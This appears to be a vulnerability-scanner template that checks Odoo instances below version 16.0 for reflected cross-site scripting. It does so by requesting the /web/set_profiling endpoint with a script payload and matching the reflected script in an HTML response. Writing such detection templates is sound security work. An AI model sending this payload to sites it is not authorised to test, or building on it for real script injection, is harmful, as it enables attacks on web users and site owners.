id: odoo-xss
info:
  name: Odoo Cross-Site Scripting
  author: camptocamp
  severity: medium
  description: |
    Unpatched Odoo versions < 16.0 are prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
  reference: |
    - https://www.sonarsource.com/blog/odoo-get-your-content-type-right-or-else/
    - https://github.com/odoo/odoo/commit/ec8dd1ad7731be32d43a12435def7c720cdcad32
  tags: odoo,xss
http:
  - method: GET
    path:
      - '{{BaseURL}}/web/set_profiling?profile=0&collectors=<script>alert(document.domain)</script>'
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'text/html'
      - type: word
        part: body
        words:
          - '<script>alert(document.domain)</script>'
